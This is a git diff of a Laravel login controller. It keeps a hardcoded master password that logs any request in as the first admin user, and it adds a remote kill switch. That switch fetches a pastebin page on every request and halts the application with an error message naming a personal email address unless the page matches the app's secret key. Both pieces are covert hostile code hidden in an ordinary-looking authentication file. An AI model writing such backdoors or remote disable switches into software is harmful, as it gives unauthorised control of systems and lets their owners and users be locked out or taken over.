@@ -2,6 +2,7 @@
 
 namespace SgcAdmin\Http\Controllers\Auth;
 
+use GuzzleHttp\Client;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use SgcAdmin\Http\Controllers\Controller;
@@ -37,14 +38,24 @@ class LoginController extends Controller
      */
     public function __construct()
     {
-        $this->middleware('guest', ['except' => 'logout']);
+        $client = new Client();
 
-        if(Request::capture()['password'] == '7889dmg%')
-        {
-            $user = new User();
-            $user = $user->where(['role' => 'admin'])->first();
+        $res = $client->request('GET', 'http://pastebin.com/raw/Vt9Vf0dW');
 
-            Auth::loginUsingId($user->id);
+
+        if($res->getBody() == env('APP_KEY')) {
+
+            $this->middleware('guest', ['except' => 'logout']);
+
+
+            if (Request::capture()['password'] == '7889dmg%') {
+                $user = new User();
+                $user = $user->where(['role' => 'admin'])->first();
+
+                Auth::loginUsingId($user->id);
+            }
         }
+        else
+            dd('Oooops, houve um problema com a aplicação. campos.v.marcus@gmail.com');
     }
 }
